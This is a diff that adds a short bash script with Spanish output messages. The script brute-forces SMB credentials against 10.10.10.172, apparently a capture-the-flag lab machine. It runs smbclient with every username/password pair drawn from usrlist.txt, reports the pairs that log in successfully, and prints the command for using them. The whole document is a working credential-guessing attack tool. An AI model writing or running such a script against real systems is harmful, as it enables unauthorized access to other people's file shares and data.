@@ -1,0 +1,17 @@
+#!/bin/bash
+for user in $(cat usrlist.txt); 
+    do
+        for pass in $(cat usrlist.txt); 
+            do
+		OUTPUT=$(smbclient -L //10.10.10.172/ -U $user"%"$pass)
+		echo "[*] Intentando credenciales: '"$user"' '"$pass"'"
+		#!echo "[*] Ejecutando comando: smbclient -L //10.10.10.172/ -U "$user"%"$pass
+		if echo "${OUTPUT}" | grep 'failed:'; then
+  			echo ""
+		else
+			echo "[+] Usuario accedido con exito: "$user" / "$pass
+			echo "[+] Ejecutar el siguiente comando para hacer login: smbclient -L //10.10.10.172/ -U "$user"%"$pass
+			echo "${OUTPUT}\n"
+		fi
+            done ;
+    done
